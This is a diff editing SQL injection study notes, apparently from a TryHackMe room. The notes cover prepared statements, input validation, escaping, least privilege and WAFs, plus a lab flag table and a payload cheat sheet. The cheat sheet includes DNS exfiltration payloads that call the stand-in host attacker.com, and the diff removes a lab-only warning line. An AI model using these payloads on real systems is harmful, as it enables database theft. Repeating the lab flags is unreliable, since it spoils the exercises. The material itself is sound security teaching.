@@ -334,8 +334,8 @@ Something has to be listening for the callback:
 
 Roughly ordered from strongest to weakest/supplementary:
 
-### Prepared Statements (Parameterized Queries) — *the primary defense*
-**Definition**: a technique where the SQL query's structure is written and compiled first, with user input passed in *separately* as bound parameters rather than concatenated into the query string. Because the query structure is fixed before any user input arrives, the database always distinguishes code from data — user input can never be reinterpreted as SQL syntax, no matter what characters it contains.
+### Prepared Statements (Parameterized Queries): *the primary defense*
+**Definition**: a technique where the **SQL query's structure is written and compiled first, with user input passed in *separately* as bound parameters rather than concatenated into the query string**. Because the query structure is fixed before any user input arrives, **the database always distinguishes code from data. User input can never be reinterpreted as SQL syntax, no matter what characters it contains.**
 
 Vulnerable (PHP):
 ```php
@@ -350,16 +350,16 @@ Fixed (Python):
 ```python
 cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
 ```
-The placeholder (`?` or `%s`) is filled in by the database driver as a literal value — even a malicious string like `' OR 1=1--` is treated as one plain string, never as part of the query's logic.
+The database driver fills in the placeholder (`?` or `%s`) as a literal value, even a malicious string like `' OR 1=1--` is treated as one plain string, never as part of the query's logic.
 
 ### Input Validation
-**Definition**: checking and restricting user input against an expected format *before* it ever reaches the database — ideally via **allow-listing** (defining exactly what's valid and rejecting everything else) rather than **block-listing** (trying to filter out "bad" characters, which attackers reliably bypass through encoding tricks or unexpected syntax). Example: if a parameter should be a numeric ID, reject anything that isn't purely digits before it's used. Input validation is a useful supplement, never a substitute for prepared statements.
+**Definition**: **checking and restricting user input against an expected format *before* it ever reaches the database**. Ideally via **allow-listing** (defining exactly what's valid and rejecting everything else) rather than **block-listing** (trying to filter out "bad" characters, which attackers reliably bypass through encoding tricks or unexpected syntax). Example: if a parameter should be a numeric ID, reject anything that isn't purely digits before it's used. Input validation is a useful supplement, never a substitute for prepared statements.
 
 ### Escaping User Input
-**Definition**: prefixing SQL's special characters (`' " $ \`) with a backslash so the database engine treats them as literal text rather than syntax — e.g. `'` becomes `\'`. This is an older, weaker, database-engine-specific technique (different engines escape differently), best treated as a last resort for legacy code that can't easily be refactored to use prepared statements.
+**Definition**: prefixing SQL's special characters (`' " $ \`) with a backslash so the database engine treats them as literal text rather than syntax: e.g., `'` becomes `\'`. This is an older, weaker, database-engine-specific technique (different engines escape differently), best treated as a last resort for legacy code that can't easily be refactored to use prepared statements.
 
 ### Principle of Least Privilege
-**Definition**: a broader security principle stating that any account or process — including the database account a web application connects with — should be granted only the minimum permissions it actually needs. A read-only application's DB account should have `SELECT` only; applications should never connect as `root`/`sa`; sensitive tables should only be reachable by the specific processes that need them. This doesn't prevent SQLi, but it limits the damage if an injection does succeed — an attacker stuck with a low-privilege account can't drop tables or reach other databases.
+**Definition**: a broader security principle stating that any account or process, including the database account a web application connects with, should be granted only the minimum permissions it actually needs. A read-only application's DB account should have `SELECT` only; applications should never connect as `root`/`sa`; sensitive tables should only be reachable by the specific processes that need them. This doesn't prevent SQLi, but it limits the damage if an injection does succeed — an attacker stuck with a low-privilege account can't drop tables or reach other databases.
 
 ### Web Application Firewalls (WAFs)
 **Definition**: a security layer that inspects incoming HTTP requests and blocks known malicious patterns (`' OR 1=1`, `UNION SELECT`, `information_schema`, etc.) before they reach the application. Useful as an additional layer, but not a substitute for secure code — experienced attackers routinely bypass WAFs using encoding tricks, alternate syntax, or obfuscation.
@@ -367,7 +367,6 @@ The placeholder (`?` or `%s`) is filled in by the database driver as a literal v
 **Q&A**
 - Name a method of protecting against SQLi: **Prepared statements**
 
----
 
 ## Practical Labs
 
@@ -382,7 +381,6 @@ Both rooms' hands-on lab work (Union-Based, Authentication Bypass, Boolean-Based
 | 3 | Boolean-Based (Blind) | `THM{SQL_INJECTION_1093}` |
 | 4 | Time-Based (Blind) | `THM{SQL_INJECTION_MASTER}` |
 
----
 
 ## Cheat Sheet — Common SQLi Payloads
 
@@ -403,12 +401,10 @@ Both rooms' hands-on lab work (Union-Based, Authentication Bypass, Boolean-Based
 | DNS exfiltration (MySQL, Windows) | `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\share'));` | Requires outbound DB server access |
 | DNS exfiltration (MSSQL) | `EXEC master..xp_dirtree '\\attacker.com\share';` | |
 
-⚠️ For lab/authorized testing environments only.
 
----
 
 ## Key Takeaways
-- SQLi happens when unvalidated user input becomes part of an executed SQL command instead of staying pure data.
+- **SQLi happens when unvalidated user input becomes part of an executed SQL command instead of staying pure data.**
 - Three types: **In-Band** (results visible directly), **Blind** (yes/no or timing only), **Out-of-Band** (results exfiltrated via a separate channel like DNS).
 - `UNION`'s matching-column-count requirement is the reason column-count probing (`1`, `1,2`, `1,2,3`...) is always step one.
 - `information_schema` turns a confirmed injection point into full knowledge of a database's structure.
